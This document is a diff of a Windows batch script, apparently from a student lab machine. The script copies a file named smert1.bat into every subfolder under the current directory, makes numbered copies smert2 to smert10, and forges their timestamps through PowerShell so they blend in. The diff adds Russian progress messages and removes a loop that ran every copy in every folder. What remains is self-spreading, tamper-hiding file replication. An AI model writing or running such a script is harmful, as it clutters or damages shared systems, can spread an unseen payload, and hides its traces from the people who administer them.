@@ -1,16 +1,27 @@
-
 @echo off
 setlocal enabledelayedexpansion
 
 set "SOURCE=C:\Users\Student10\Videos\smert1.bat"
 
+echo Проверка исходного файла...
 if not exist "%SOURCE%" (
+    echo ОШИБКА: smert1.bat не найден по пути:
+    echo %SOURCE%
+    pause
     exit /b
+) else (
+    echo Исходный файл найден.
 )
 
+echo Запуск рекурсивного обхода...
+echo.
+
 for /r "%CD%" %%D in (.) do (
+    echo Обработка: %%\~D
+    
     if not exist "%%\~D\smert1.bat" (
         copy /y "%SOURCE%" "%%\~D\smert1.bat" >nul 2>&1
+        echo    + smert1.bat скопирован
     )
     
     for %%N in (2 3 4 5 6 7 8 9 10) do (
@@ -24,14 +35,10 @@ for /r "%CD%" %%D in (.) do (
             powershell -NoProfile -Command "$file=Get-Item '%%\~D\smert%%N.bat'; $date=Get-Date '2024-01-15 12:3%%N:00'; $file.CreationTime=$date; $file.LastWriteTime=$date; $file.LastAccessTime=$date" >nul 2>&1
         )
     )
-    
-    for %%F in ("%%\~D\smert*.bat") do (
-        if exist "%%\~F" (
-            pushd "%%\~D" >nul 2>&1
-            call "%%\~F"
-            popd >nul 2>&1
-        )
-    )
 )
 
+echo.
+echo ======================================
+echo Скрипт завершил работу.
+pause
 endlocal
